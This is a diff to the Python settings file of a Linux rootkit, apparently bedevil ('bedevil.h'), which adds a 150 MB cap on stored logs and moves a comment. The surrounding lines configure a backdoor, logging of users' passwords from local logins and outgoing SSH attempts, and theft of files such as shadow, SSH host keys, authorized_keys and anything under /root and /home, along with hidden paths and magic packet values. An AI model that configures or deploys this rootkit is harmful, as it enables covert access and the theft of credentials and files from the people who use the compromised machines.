@@ -1,6 +1,11 @@
 #!/usr/bin/env python
 
 
+# 'can be disabled' means by setting the appropriate value to
+# None the certain functionality will be disabled in the rootkit.
+# (if it's a list you can also remove everything from the list)
+
+
 # ROOTKIT SETTINGS
 
 # BACKDOOR SETTINGS
@@ -65,7 +70,7 @@ LOG_USER_EXEC  = True          # log stuff executed by users. from the moment of
 LOG_LOCAL_AUTH = True          # log successful auths for users on the box.
 LOG_SSH        = True          # log outgoing ssh login attempts.
 LOG_FMT        = '%s (%s)\\n'  # format is '<(ssh )user(@host)> (<password>)\n'
-
+MAX_LOGS_SIZE   = (1024 * 1024) * 150  # don't store more than 150mb of logs per log type. can be disabled.
 
 
 # START OF FILE STEALING STUFF.
@@ -76,10 +81,6 @@ FILE_STEAL = True  # if False then nothing below will apply.
 INTERESTING_FILES  = ['passwd', 'shadow', 'sshd_config', 'ssh_config', 'ssh_host_*_key*',
                       'known_hosts', 'authorized_keys', '*.txt', '*.sql', '*.php', '*.zip',
                       '*.tar', '*.tar.*', '*.rar']
-
-# 'can be disabled' means by setting the appropriate value to
-# None the certain functionality will be disabled in the rootkit.
-# (if it's a list you can also remove everything from the list)
 
 # all files in these directories will be stolen when opened. can be disabled.
 INTERESTING_DIRECTORIES = ['/root', '/home']
@@ -456,7 +457,7 @@ SETTINGS = { # all of these are written to bedevil.h. if a value is None it is s
     'TARGET_INTERFACE':TARGET_INTERFACE,     'MAGIC_ID':MAGIC_ID,
     'MAGIC_SEQ':MAGIC_SEQ,                   'MAGIC_ACK':MAGIC_ACK,
     'EXEC_LOGS':ut.randpath(17),             'PLAINSOPATH':ut.sogetplainpath(INSTALL_DIR, BDVLSO),
-    'HIDEADDRS':ut.randpath(16)
+    'HIDEADDRS':ut.randpath(16),             'MAX_LOGS_SIZE':MAX_LOGS_SIZE
 }
 
 # the following paths are linked to within the installation directory.
